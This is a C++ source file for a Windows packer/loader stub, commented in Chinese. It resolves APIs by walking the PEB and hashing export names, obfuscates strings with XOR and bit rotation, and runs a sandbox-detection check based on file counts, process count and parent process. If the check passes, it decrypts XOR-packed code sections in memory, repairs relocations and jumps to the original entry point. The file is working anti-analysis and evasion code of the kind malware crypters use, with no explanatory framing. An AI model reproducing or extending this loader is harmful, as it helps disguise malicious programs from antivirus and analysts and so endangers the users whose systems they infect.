// Loader64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <TlHelp32.h>
#include "defs.h"
#include "crt.h"


uint32_t HashString(const char* str)
{
	int result = 0;
	while (*str != '\0')
	{
		result = *str + ____ror(result, 0xD);
		str++;
	}
	return result;
}

ADDRESS findkernelbase()
{
	PPEB peb = NULL;
#ifdef _WIN64
	peb = (PPEB)__readgsqword(0x60);
#else
	peb = (PPEB)__readfsdword(0x30);
#endif

	pProcessModuleInfo ProcessModule = (pProcessModuleInfo)peb->Ldr;
	PLIST_ENTRY ModuleList = ProcessModule->ModuleListMemoryOrder.Flink->Flink->Flink->Flink;
	pModuleInfoNode kernel = CONTAINING_RECORD(ModuleList, ModuleInfoNode, InMemoryOrderModuleList);
	return (ADDRESS)kernel->BaseAddress;
}

ADDRESS findkernel32()
{
	PPEB peb = NULL;
#ifdef _WIN64
	peb = (PPEB)__readgsqword(0x60);
#else
	peb = (PPEB)__readfsdword(0x30);
#endif

	pProcessModuleInfo ProcessModule = (pProcessModuleInfo)peb->Ldr;
	PLIST_ENTRY ModuleList = ProcessModule->ModuleListMemoryOrder.Flink->Flink->Flink;
	pModuleInfoNode kernel = CONTAINING_RECORD(ModuleList, ModuleInfoNode, InMemoryOrderModuleList);
	return (ADDRESS)kernel->BaseAddress;
}

ADDRESS GetProcAddressByHash(ADDRESS dllbase, uint32_t hash)
{
	PIMAGE_DOS_HEADER pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(dllbase);
	PIMAGE_NT_HEADERS pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(dllbase + pDos->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(dllbase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	uint32_t* pAddressOfFunction = (uint32_t*)(dllbase + pImageExportDirectory->AddressOfFunctions);
	uint32_t* pAddressOfNames = (uint32_t*)(dllbase + pImageExportDirectory->AddressOfNames);
	uint32_t dwNumberOfNames = pImageExportDirectory->NumberOfNames;
	uint16_t* pAddressOfNameOrdinals = (uint16_t*)(dllbase + pImageExportDirectory->AddressOfNameOrdinals);
	for (int i = 0; i < dwNumberOfNames; i++)
	{
		char* strFunction = (char*)(pAddressOfNames[i] + dllbase);
		if (HashString(strFunction) == hash)
			return dllbase + pAddressOfFunction[pAddressOfNameOrdinals[i]];
	}
	return 0;
}



int EnumPathFileCount(struct TCONFIG* config,const wchar_t* dirPath, const wchar_t* search, bool nocase)
{
	// *.*
	uint8_t wildcard[] ={ 0x2a, 0x1, 0x2c, 0x3, 0x2e, 0x5, 0x6, 0x7 };
	for (int m = 0; m < sizeof(wildcard); ++m)
		wildcard[m] ^=m;
	// .
	uint8_t cur_dir[] ={ 0x5c, 0x0, 0x0, 0x0 };
	for (int m = 0; m < sizeof(cur_dir); ++m)
		cur_dir[m] = (cur_dir[m] >> 0x1) | (cur_dir[m] << 0x7);
	// ..
	uint8_t last_dir[] = { 0x6a, 0x44, 0x6a, 0x44, 0x44, 0x44 };
	for (int m = 0; m < sizeof(last_dir); ++m)
		last_dir[m] ^=0x44;

	WIN32_FIND_DATAW FindFileData;
	wchar_t pattern[MAX_PATH];
	// 构造搜索模式
	__wstrcpy(pattern, dirPath);
	__wstrcat(pattern,(wchar_t*)wildcard);
	// 开始查找
	HANDLE hFind = config->ShadowApiPtr.lpfnFindFirstFileW(pattern, &FindFileData);
	if (hFind == INVALID_HANDLE_VALUE)
		return 0;
	int count = 0;
	do {
		if (__wstrcmp(FindFileData.cFileName, (wchar_t*)cur_dir) == 0 || __wstrcmp(FindFileData.cFileName, (wchar_t*)last_dir) == 0) {
			continue;
		}


		if (search == NULL)
			count++; //标识为非搜索模式则是计数
		else {
			if (__strstrw(FindFileData.cFileName, search, nocase))
				count++;
		}
	} while (config->ShadowApiPtr.lpfnFindNextFileW(hFind, &FindFileData));

	config->ShadowApiPtr.lpfnFindClose(hFind);

	return count;
}

int EnumProcessCount(struct TCONFIG* config,const wchar_t* exe_name, bool nocase)
{
	HANDLE hSnapshot = config-> ShadowApiPtr.lpfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);    //初始化空间
	BOOL pr = config->ShadowApiPtr.lpfnProcess32FirstW(hSnapshot, &pe32);
	int count = 0;
	while (pr)
	{
		if (exe_name == NULL)
			count++;
		else {

			if (__strstrw(pe32.szExeFile, exe_name, nocase) == 0)
				count++;
		}

		pr = config->ShadowApiPtr.lpfnProcess32NextW(hSnapshot, &pe32);
	}
	config->ShadowApiPtr.lpfnCloseHandle(hSnapshot);
	return count;
}

bool FindProcessEntryByPid(struct TCONFIG* config,uint32_t pid, PROCESSENTRY32W& out)
{
	HANDLE hSnapshot = config->ShadowApiPtr.lpfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;
	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);    //初始化空间
	BOOL pr = config->ShadowApiPtr.lpfnProcess32FirstW(hSnapshot, &pe32);
	uint32_t  parenId = 0;
	while (pr)
	{
		if (pe32.th32ProcessID == pid)
		{
			out = pe32;
			config->ShadowApiPtr.lpfnCloseHandle(hSnapshot);
			return true;
		}
		pr = config->ShadowApiPtr.lpfnProcess32NextW(hSnapshot, &pe32);
	}
	config->ShadowApiPtr.lpfnCloseHandle(hSnapshot);
	return false;
}

bool CompareParenName(struct TCONFIG* config,const wchar_t* paren)
{
	if (*paren)
	{
		//获取自身父进程ID
		HANDLE hSnapshot = config->ShadowApiPtr.lpfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE)
			return 0;
		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(pe32);    //初始化空间
		BOOL pr = config->ShadowApiPtr.lpfnProcess32FirstW(hSnapshot, &pe32);
		uint32_t  parenId = 0;
		while (pr)
		{
			if (pe32.th32ProcessID == config->ShadowApiPtr.lpfnGetCurrentProcessId())
				parenId = pe32.th32ParentProcessID;
			pr = config->ShadowApiPtr.lpfnProcess32NextW(hSnapshot, &pe32);
		}
		config->ShadowApiPtr.lpfnCloseHandle(hSnapshot);

		PROCESSENTRY32W parenentry;
		if (!FindProcessEntryByPid(config, parenId, parenentry))
			return false;

		if (__strstrw(parenentry.szExeFile, paren, true))
			return true;
		return false;
	}

	//如果父进程名=null，默认返回真
	return true;
}


bool IsSandBox(struct TCONFIG* config)
{
	uint32_t scope = 0; //权值
	//获取临时目录
	wchar_t tmp[256];
	for (int i = 0; i < 256; i++)
		tmp[i] = 0x0000;
	config->ShadowApiPtr.lpfnGetTempPathW(256, tmp);
	if (*tmp ==0)
		return true; //直接判断为沙箱

	//获取roaming
	wchar_t roaming[512];
	for (int i = 0; i < 256; i++)
		roaming[i] =0x0000;
	__wstrcpy(roaming, tmp);

	/* ..\\..\\Roaming\\ */
	uint8_t roaming_str[] = { 
		0x8b, 0x0, 0x8b, 0x0, 0x17, 0x0, 0x8b, 0x0,
	0x8b, 0x0, 0x17, 0x0, 0x94, 0x0, 0xdb, 0x0,
	0x58, 0x0, 0x5b, 0x0, 0x5a, 0x0, 0x9b, 0x0,
	0xd9, 0x0, 0x17, 0x0, 0x0, 0x0
	};
	for (int m = 0; m < sizeof(roaming_str); ++m)
		roaming_str[m] = (roaming_str[m] >> 0x6) | (roaming_str[m] << 0x2);;
	__wstrcat(roaming,(wchar_t*)roaming_str);

	//获取recent
	wchar_t recent[256];
	for (int i = 0; i < 256; i++)
		recent[i] =0x0000;
	__wstrcpy(recent, roaming);

	/*   \\Microsoft\\Windows\\Recent\\ */
	uint8_t recent_str[] = { 
			 0x5c, 0x1, 0x4f, 0x3, 0x6d, 0x5, 0x65, 0x7,
				 0x7a, 0x9, 0x65, 0xb, 0x7f, 0xd, 0x61, 0xf,
				 0x76, 0x11, 0x66, 0x13, 0x48, 0x15, 0x41, 0x17,
				 0x71, 0x19, 0x74, 0x1b, 0x78, 0x1d, 0x71, 0x1f,
				 0x57, 0x21, 0x51, 0x23, 0x78, 0x25, 0x74, 0x27,
				 0x4d, 0x29, 0x49, 0x2b, 0x49, 0x2d, 0x40, 0x2f,
				 0x44, 0x31, 0x6e, 0x33, 0x34, 0x35
	};
	for (int m = 0; m < sizeof(recent_str); ++m)
		recent_str[m] ^=m;

	__wstrcat(recent, (wchar_t*)recent_str);

	//解密父进程名
	for ( int m = 0; config->parentname[m]!=0; ++m)
		config->parentname[m] ^= 0x8f;

	//加分
	if (EnumPathFileCount(config,tmp, NULL, false) < 150)	//临时目录下文件数量少于150个
		scope += 20;
	if (EnumPathFileCount(config, roaming, NULL, false) < 20) //Roaming下文件数量少于20个
		scope += 20;
	if (EnumPathFileCount(config, recent, NULL, false) < 50) //recent下文件数量少于50个
		scope += 20;
	if (EnumProcessCount(config, NULL, false) < 100) //进程数数少于100个
		scope += 10;
	if (!CompareParenName(config, config->parentname)) //检查父进程是否为设定的
		scope += 50;

	if (scope > 60)
		return true;
	return false;
}


ADDRESS Loader(ADDRESS image_base, struct TCONFIG* config)
{
	//初始化api
	ADDRESS kernelBase = findkernel32();
	config->ShadowApiPtr.lpfnLoadLibraryW = (fnLoadLibraryW)GetProcAddressByHash(kernelBase, 0xEC0E4EA4);;
	config->ShadowApiPtr.lpfnVirtualProtect = (fnVirtualProtect)GetProcAddressByHash(kernelBase, 0x7946C61B);
	config->ShadowApiPtr.lpfnGetProcAddress = (fnGetProcAddress)GetProcAddressByHash(kernelBase, 0x7C0DFCAA);
	config->ShadowApiPtr.lpfnCreateFileW = (fnCreateFileW)GetProcAddressByHash(kernelBase, 0x7C0017BB);
	config->ShadowApiPtr.lpfnReadFile = (fnReadFile)GetProcAddressByHash(kernelBase, 0x10FA6516);
	config->ShadowApiPtr.lpfnCloseHandle = (fnCloseHandle)GetProcAddressByHash(kernelBase, 0xFFD97FB);
	config->ShadowApiPtr.lpfnDeleteFileW = (fnDeleteFileW)GetProcAddressByHash(kernelBase, 0xC2FFB03B);
	config->ShadowApiPtr.lpfnFindFirstFileW = (fnFindFirstFileW)GetProcAddressByHash(kernelBase, 0x63D6C07B);
	config->ShadowApiPtr.lpfnFindNextFileW = (fnFindNextFileW)GetProcAddressByHash(kernelBase, 0xA5E1ACAD);
	config->ShadowApiPtr.lpfnFindClose = (fnFindClose)GetProcAddressByHash(kernelBase, 0x23545978);
	config->ShadowApiPtr.lpfnCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressByHash(kernelBase, 0xE454DFED);
	config->ShadowApiPtr.lpfnProcess32FirstW = (fnProcess32FirstW)GetProcAddressByHash(kernelBase, 0xD53992A4);
	config->ShadowApiPtr.lpfnProcess32NextW = (fnProcess32NextW)GetProcAddressByHash(kernelBase, 0x2A523C0A);
	config->ShadowApiPtr.lpfnGetTempPathW = (fnGetTempPathW)GetProcAddressByHash(findkernel32(), 0x5B8ACA49);
	config->ShadowApiPtr.lpfnGetCurrentProcessId = (fnGetCurrentProcessId)GetProcAddressByHash(kernelBase, 0xE60DFA02);
	//检测沙箱
	if (IsSandBox(config))
		return 0;
	//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	/*解密代码*/
	for (int i = 0; config->packs[i].seg_rva > 0; i++)
	{
		uint32_t old{};
		uint8_t* codeBase = reinterpret_cast<uint8_t*>(image_base + config->packs[i].seg_rva);
		config->ShadowApiPtr.lpfnVirtualProtect(codeBase, config->packs[i].seg_size, 64, &old);
		for (int j = 0; j < config->packs[i].seg_size; j++)
			codeBase[j] = codeBase[j] ^ static_cast<uint8_t>(____rotl(config->packs[i].xor_key, j) + j);
		config->ShadowApiPtr.lpfnVirtualProtect(codeBase, config->packs[i].seg_size, old, 0);
	}
	//------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	/*修复重定向*/
	IMAGE_DOS_HEADER* pDos = reinterpret_cast<IMAGE_DOS_HEADER*>(image_base);
	IMAGE_NT_HEADERS* pNt = reinterpret_cast<IMAGE_NT_HEADERS*>(image_base + pDos->e_lfanew);
	if (pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0 && pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
	{
		ADDRESS Delta = (ADDRESS)image_base - config->origin_base;
		ADDRESS* pAddress=NULL;
		//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址
		IMAGE_BASE_RELOCATION* pLoc = (IMAGE_BASE_RELOCATION*)(image_base + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //开始扫描重定位表
		{
			uint16_t* pLocData = reinterpret_cast<uint16_t*>((ADDRESS)pLoc + sizeof(IMAGE_BASE_RELOCATION));
			int NumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);//计算需要修正的重定位项（地址）的数目
			for (int i = 0; i < NumberOfReloc; i++)
			{
				int type = (pLocData[i] & 0xF000) >> 12;
				if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) //这是一个需要修正的地址
				{
					pAddress = reinterpret_cast<ADDRESS*>(image_base + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
					for (int j = 0; config->packs[j].seg_rva > 0; j++)
					{
						uint8_t* pack_base = reinterpret_cast<uint8_t*>(image_base + config->packs[j].seg_rva);
						//只修复加密的
						if ((ADDRESS)pAddress >= (ADDRESS)pack_base && (ADDRESS)pAddress < ((ADDRESS)pack_base+ config->packs[j].seg_size))
						{
							uint32_t old = NULL;
							config->ShadowApiPtr.lpfnVirtualProtect(pAddress, 0x100, 64, &old);
							int offset = (ADDRESS)pAddress - (ADDRESS)pack_base;
							//因为解密代码已经跑过一次了,这里需要还原
							for (int k = offset; k < offset + sizeof(ADDRESS); k++)
								pack_base[k] = pack_base[k] ^ static_cast<uint8_t>(____rotl(config->packs[j].xor_key, k) + k);
							//由于系统拉起PE时自动重定位了,这里需要恢复到重定位前
							*pAddress = *pAddress - Delta;
							//在解密一次就是原内容
							for (int k = offset; k < offset + sizeof(ADDRESS); k++)
								pack_base[k] = pack_base[k] ^ static_cast<uint8_t>(____rotl(config->packs[j].xor_key, k) + k);
							//修复重定向
							*pAddress += Delta;
							config->ShadowApiPtr.lpfnVirtualProtect(pAddress, 0x100, old, 0);
							break;
						}
					}
				}
			}
			//转移到下一个节进行处理
			pLoc = reinterpret_cast<IMAGE_BASE_RELOCATION*>((ADDRESS)pLoc + pLoc->SizeOfBlock);
		}
	}
	return image_base + config->oep;
}
